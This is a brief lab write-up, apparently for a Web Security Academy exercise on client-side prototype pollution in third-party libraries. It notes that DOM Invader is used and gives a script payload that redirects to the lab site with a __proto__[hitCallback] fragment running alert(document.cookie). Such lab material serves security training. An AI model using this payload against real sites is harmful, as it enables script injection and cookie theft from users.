---
title: "5 - Client-side prototype pollution in third-party libraries"
---

# 5 - Client-side prototype pollution in third-party libraries

Usaremos DOM invader

```html
<script>
window.location='https://0ae300d304e1ebca80aeb26a007a005d.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29'
</script>
```
